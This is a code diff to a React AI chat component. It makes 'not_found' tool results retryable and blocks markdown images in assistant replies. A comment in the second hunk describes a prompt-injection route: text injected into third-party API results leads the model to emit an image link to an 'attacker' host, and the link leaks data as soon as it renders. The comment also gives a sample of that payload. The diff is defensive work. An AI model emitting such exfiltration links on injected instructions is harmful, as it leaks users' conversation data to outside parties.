@@ -518,7 +518,10 @@ export function AssistantChat() {
         for (const call of toolCalls) {
           const { result, imageUrl } = await runToolCall(call);
           if (imageUrl) finalImageUrl = imageUrl;
-          if (result.status !== "ok") failedTools.add(call.function.name);
+          // `not_found` (an unrecognized slug) is a normal, recoverable outcome — the whole point
+          // of the list-then-detail pattern in the system prompt is that the model can retry with
+          // a corrected slug. Only a real failure withdraws the tool for the rest of the turn.
+          if (result.status !== "ok" && result.status !== "not_found") failedTools.add(call.function.name);
           else if (BUNDESTAKT_TOOL_NAMES.has(call.function.name)) usedBundestakt = true;
           convo.push({ role: "tool", tool_call_id: call.id, content: JSON.stringify(result) });
         }
@@ -689,7 +692,16 @@ export function AssistantChat() {
                       }`}
                     >
                       {message.role === "assistant" ? (
-                        <ReactMarkdown remarkPlugins={[remarkGfm]}>{message.content}</ReactMarkdown>
+                        /* Markdown images are dropped, links are not. An image loads itself the
+                           moment it renders, so a model talked into emitting
+                           `![](https://attacker/?q=…)` — by injected text in a tool result, which
+                           the Bundestakt lookups pull from a third-party API without any
+                           confirmation step — would exfiltrate on sight. A link needs a click.
+                           This does NOT affect the generated image below: that renders through
+                           its own <img>, not through markdown. */
+                        <ReactMarkdown remarkPlugins={[remarkGfm]} components={{ img: () => null }}>
+                          {message.content}
+                        </ReactMarkdown>
                       ) : (
                         <div className={chat.messageContentPlain}>{message.content}</div>
                       )}
